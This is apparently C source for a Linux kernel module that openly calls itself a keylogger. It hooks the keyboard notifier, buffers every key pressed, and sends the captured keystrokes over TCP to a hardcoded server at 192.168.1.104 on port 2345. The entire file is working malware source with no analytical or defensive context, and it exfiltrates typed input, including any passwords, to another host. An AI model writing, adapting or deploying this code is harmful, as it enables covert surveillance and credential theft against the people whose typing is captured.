#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/notifier.h>
#include <linux/keyboard.h>
#include <linux/init.h>

#include <linux/net.h>
#include <net/sock.h>
#include <linux/tcp.h>
#include <linux/in.h>
#include <asm/uaccess.h>
#include <linux/socket.h>
#include <linux/slab.h>


#define SERVER_PORT 2345 // port of the server, where the captured keystrokes are sent to
#define KEYBOARD_BUFFER_SIZE 50 // how many chars are buffered until they are sent to the server

struct socket *conn_socket = NULL; // socket to the server receiving keystrokes
unsigned char server_ip[5] = {192, 168, 1, 104, '\0'}; // IP of the server receiving keystrokes
char keyboard_buffer[KEYBOARD_BUFFER_SIZE]; // buffer for captured keystrokes
size_t keyboard_buffer_index = 0;

// Mapping keycodes to chars. Not complete. Some special characters mapped to underscore
static const char keymap[] = {
	'_', '_', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0',
	'-', '=', '_', '_', 'q', 'w', 'e', 'r', 't', 'y',
	'u', 'i', 'o', 'p', '[', ']', '_', '_', 'a', 's', 'd',
	'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', '`', '_', '\\', 'z',
	'x', 'c', 'v', 'b', 'n', 'm', ',', '.'
};

static u32 create_address(u8 *ip) {
	u32 addr = 0;
	int i;
	for (i = 0; i < 4; i++) {
		addr += ip[i];
		if (i == 3) {
			break;
		}
		addr <<= 8;
	}
	return addr;
}

static void tcp_send_to_server(struct socket *sock, const char *buf, const size_t length, unsigned long flags) {
	struct msghdr msg;
	struct kvec vec;
	int len;
	int written = 0; 
	int left = length;

	msg.msg_name = 0;
	msg.msg_namelen = 0;
	msg.msg_control = NULL;
	msg.msg_controllen = 0;
	msg.msg_flags = flags;

repeat_send:
	vec.iov_len = left;
	vec.iov_base = (char *)buf + written;
	len = kernel_sendmsg(sock, &msg, &vec, left, left);
	if ((len == -ERESTARTSYS) || (!(flags & MSG_DONTWAIT) && (len == -EAGAIN))) {
		goto repeat_send;
	}
	if (len > 0) {
		written += len;
		left -= len;
		if (left) {
			goto repeat_send;
		}
	}
}

static int tcp_connection_init(void) {
	struct sockaddr_in saddr;
	int ret = -1;

	ret = sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &conn_socket);
	if (ret < 0) {
		pr_info("Error: %d while creating socket", ret);
		return -1;
	}

	memset(&saddr, 0, sizeof(saddr));
	saddr.sin_family = AF_INET;
	saddr.sin_port = htons(SERVER_PORT);
	saddr.sin_addr.s_addr = htonl(create_address(server_ip));

	ret = conn_socket->ops->connect(conn_socket, (struct sockaddr *) &saddr, sizeof(saddr), O_RDWR);
	if (ret && (ret != -EINPROGRESS)) {
		pr_info("Error: %d while connecting using conn_socket", ret);
		return -1;
	}

	return 0;
}

// Called on every keystroke
int notify_keypress(struct notifier_block *nb, unsigned long code, void *_param) {
	struct keyboard_notifier_param *param = _param;
	if (code == KBD_KEYCODE && param->down) {
		unsigned int keycode = param->value;
		size_t keymap_size = sizeof(keymap) / sizeof(keymap[0]);
		if (keycode < keymap_size) { // mapping for that keycode exists
			if (keyboard_buffer_index < KEYBOARD_BUFFER_SIZE) {
				keyboard_buffer[keyboard_buffer_index++] = keymap[keycode];
				if (keyboard_buffer_index == KEYBOARD_BUFFER_SIZE) { // buffer is full
					tcp_send_to_server(conn_socket, keyboard_buffer, KEYBOARD_BUFFER_SIZE, MSG_DONTWAIT);
					
					// clear buffer
					memset(keyboard_buffer, 0, KEYBOARD_BUFFER_SIZE);
					keyboard_buffer_index = 0;
				}
			}
		}
	}
	return NOTIFY_OK;
}

static struct notifier_block nb = {
	.notifier_call = notify_keypress
};

// Called when loading the kernel module
static int __init startup(void) {
	register_keyboard_notifier(&nb);
	tcp_connection_init();
	pr_info("Loaded keylogger!\n");
	return 0;
}

// Called when unloading the kernel module
static void __exit shutdown(void) {
	unregister_keyboard_notifier(&nb);
	sock_release(conn_socket);
	pr_info("Keylogger unloaded!\n");
}

module_init(startup);
module_exit(shutdown);
MODULE_LICENSE("GPL");

